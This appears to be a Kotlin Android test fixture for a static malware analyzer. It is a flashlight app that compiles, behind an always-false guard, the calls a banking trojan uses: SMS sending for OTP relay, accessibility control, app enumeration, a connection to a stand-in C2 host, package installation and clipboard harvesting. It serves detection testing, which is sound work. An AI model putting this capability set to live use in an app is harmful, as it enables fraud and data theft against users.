package com.fixture.flashlight

import android.app.Activity
import android.content.Context
import android.content.pm.PackageInstaller
import android.os.Bundle
import android.widget.TextView

/**
 * FIXTURE 1 — "Flashlight Pro" (expected: CRITICAL).
 *
 * INERT. Every dangerous API below is compiled into the DEX (so a static analyzer sees the
 * capability) but guarded behind [NEVER], an opaque always-false value the compiler cannot fold,
 * so the body is emitted yet never executes. Nothing here does anything harmful.
 */
class MainActivity : Activity() {

    // System.nanoTime() is never 1 → false at runtime; opaque to the compiler → block is kept.
    private val NEVER: Boolean = System.nanoTime() == 1L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val tv = TextView(this)
        tv.setPadding(48, 96, 48, 48)
        tv.text = "INERT TEST FIXTURE\n“Flashlight Pro” (expected: CRITICAL)\n\n" +
            "A torch app holding a banking-trojan permission set. It does nothing: the SMS, " +
            "accessibility, overlay, install and network APIs are referenced in bytecode but " +
            "guarded off. Safe to install and demo."
        setContentView(tv)
        capabilitiesNeverRun()
    }

    @Suppress("unused", "DEPRECATION")
    private fun capabilitiesNeverRun() {
        if (!NEVER) return
        // ---- compiled, never executed ----

        // SMS send (OTP relay / premium fraud)
        val sms = getSystemService(android.telephony.SmsManager::class.java)
        sms.sendTextMessage("0000", null, "x", null, null)

        // Accessibility global action (screen control)
        val acc: android.accessibilityservice.AccessibilityService? = null
        acc!!.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)

        // Enumerate installed apps (target-list behaviour)
        packageManager.getInstalledPackages(0)

        // Network exfil sink
        val conn = java.net.URL("http://example.invalid/c2")
            .openConnection() as java.net.HttpURLConnection
        conn.connect()

        // Install further packages (dropper)
        val installer = packageManager.packageInstaller
        installer.createSession(
            PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
        )

        // Clipboard harvest
        val clip = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        @Suppress("UNUSED_VARIABLE") val data = clip.primaryClip
    }
}
